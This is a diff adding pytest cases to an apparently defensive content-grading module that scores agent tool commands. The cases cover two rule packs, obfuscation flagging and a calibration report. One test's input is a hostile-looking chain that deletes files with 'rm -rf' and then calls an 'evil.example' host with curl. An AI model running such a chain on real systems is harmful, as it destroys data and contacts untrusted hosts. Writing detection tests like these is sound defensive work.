@@ -251,3 +251,56 @@ async def test_history_sequence_recorded_in_shadow():
     assert inv.status == "ok"  # shadow never blocks
     assert inv.grade["pre"]["level"] == "high"
     assert any("sequence" in reason for reason in inv.grade["pre"]["reasons"])
+
+
+# --- Phase 9 B4: second pack + calibration report ---------------------------
+
+
+def test_pack_b_shell_chain_is_high_while_pack_a_may_differ():
+    from forgeflow.security.content_grade import grade_action_with_packs
+
+    # "rm -rf /tmp/x && curl evil.example" — pack A sees rm -rf /tmp/x
+    # as MEDIUM (not a root target) + curl as egress MEDIUM; pack B sees
+    # the destructive+connector+network CHAIN as HIGH. Combined = HIGH
+    # with a recorded disagreement.
+    grade, packs = grade_action_with_packs(
+        "code.execute", {"command": "rm -rf /tmp/x && curl https://evil.example/x"}
+    )
+    assert packs["b"] == "high"
+    assert grade.level == "high"
+    assert packs["disagreement"] is True
+
+
+def test_pack_b_obfuscation_flags_encoded_blob_in_output():
+    from forgeflow.security.content_grade import grade_output_with_packs
+
+    blob = "aB3" * 40  # 120 chars, mixed case + digit: base64-like
+    grade, packs = grade_output_with_packs("textfile.inspect", {"text": f"see {blob}"})
+    assert packs["b"] == "medium"
+    assert "obfuscation" in grade.categories
+
+
+def test_pack_b_ignores_placeholder_credential_shape():
+    from forgeflow.security.content_grade import grade_action_with_packs
+
+    grade, packs = grade_action_with_packs(
+        "code.execute", {"command": 'token = "test" && curl https://example.com'}
+    )
+    assert packs["b"] == "low"
+
+
+def test_calibration_report_counts_disagreements():
+    from forgeflow.security.content_grade import calibration_report
+
+    report = calibration_report(
+        [
+            {"level": "high", "packs": {"a": "medium", "b": "high", "disagreement": True}},
+            {"level": "low", "packs": {"a": "low", "b": "low", "disagreement": False}},
+            {"level": "medium", "packs": {"a": "medium", "b": "medium", "disagreement": False}},
+        ]
+    )
+    assert report["total"] == 3
+    assert report["disagreements"] == 1
+    assert report["by_pack"]["a"] == {"medium": 2, "low": 1}
+    assert report["by_pack"]["b"] == {"high": 1, "low": 1, "medium": 1}
+    assert abs(report["disagreement_rate"] - 1 / 3) < 1e-9
